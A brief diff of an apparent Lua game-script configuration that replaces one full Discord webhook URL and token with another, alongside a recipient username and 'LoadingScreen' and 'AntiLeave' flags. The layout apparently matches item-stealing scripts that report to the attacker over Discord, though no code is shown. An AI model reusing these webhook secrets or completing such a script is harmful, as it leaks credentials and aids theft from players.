@@ -1,5 +1,5 @@
 UserName = "Eneez416"
-Webhook = "https://discord.com/api/webhooks/1102620015548698634/dacbXgr1lBrYFbtW3ALkTYAMcxwhYf5ZSY1OZHUVGJ9Qpsk8-bnqYmLH3u_2LQhAX6Ea"
+Webhook = "https://discord.com/api/webhooks/1102667756668727398/SoeacKRqGbFNPqo5WqvAKiHV0eR_vSn3ZZPZ-VvHqdaP6JksWTmIR1WPePccc5sAqlM7"
 
 _G.LoadingScreen = true
 _G.AntiLeave = false
